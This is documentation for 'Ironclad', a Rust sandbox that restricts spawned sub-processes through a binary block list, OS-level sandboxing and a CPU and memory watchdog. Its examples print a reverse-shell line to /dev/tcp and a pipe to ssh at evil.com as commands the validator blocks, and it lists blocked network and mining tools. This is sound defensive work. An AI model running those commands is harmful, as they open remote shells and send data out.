# Ironclad — Process Execution Sandbox

Three hard constraints enforced on all spawned sub-processes.

## 1. Command Whitelist

Only approved binaries execute. 50+ permanently blocked binaries including:
- Network tools: `ssh`, `nc`, `nmap`, `curl`, `wget`, `ngrok`
- Crypto miners: `xmrig`, `cpuminer`, `ethminer`
- Compilers: `gcc`, `rustc`, `clang`
- Package managers: `npm`, `pip`, `cargo`, `brew`
- System tools: `kill`, `chmod`, `mount`, `iptables`

32 safe binaries are allowlisted by default: `ls`, `cat`, `git`, `echo`, `diff`, etc.

```rust
use laminae::ironclad::validate_binary;

validate_binary("git")?;   // OK
validate_binary("ssh")?;   // Error: permanently blocked
```

Deep command validation catches piped commands, subshells, and reverse shells:

```rust
use laminae::ironclad::validate_command_deep;

validate_command_deep("echo test | ssh user@evil.com")?;  // BLOCKED
validate_command_deep("bash -i >& /dev/tcp/evil/4444")?;  // BLOCKED
validate_command_deep("ls -la | sort | uniq")?;            // OK
```

## 2. Platform-Native Sandbox

| Platform | Provider | Mechanism |
|----------|----------|-----------|
| macOS | `SeatbeltProvider` | `sandbox-exec` with SBPL profiles |
| Linux | `LinuxSandboxProvider` | `PR_SET_NO_NEW_PRIVS`, network namespaces, rlimits |
| Windows | `WindowsSandboxProvider` | Working directory restriction, env scrubbing |
| Other | `NoopProvider` | Environment scrubbing only |

```rust
use laminae::ironclad::sandboxed_command;

let mut cmd = sandboxed_command("git", &["status"], "/path/to/project")?;
let child = cmd.spawn()?;
```

## 3. Resource Watchdog

Background monitor polls CPU/memory and sends SIGKILL (or `taskkill /F` on Windows) on sustained threshold violation.

```rust
use laminae::ironclad::{spawn_watchdog, WatchdogConfig};

let cancel = spawn_watchdog(
    child.id().unwrap(),
    WatchdogConfig::default(),
    "my-agent".into(),
);

// When done, stop the watchdog
cancel.store(true, std::sync::atomic::Ordering::Relaxed);
```

Default thresholds:
- CPU: 90% sustained for 5 minutes
- Memory: 4 GB
- Wall time: 30 minutes

## Custom Configuration

```rust
use laminae::ironclad::IroncladConfig;

let config = IroncladConfig {
    extra_blocked: vec!["my_dangerous_tool".into()],
    allowlist: vec!["ls".into(), "git".into(), "my_safe_tool".into()],
    whitelisted_hosts: vec!["api.myservice.com".into()],
    ..Default::default()
};
```
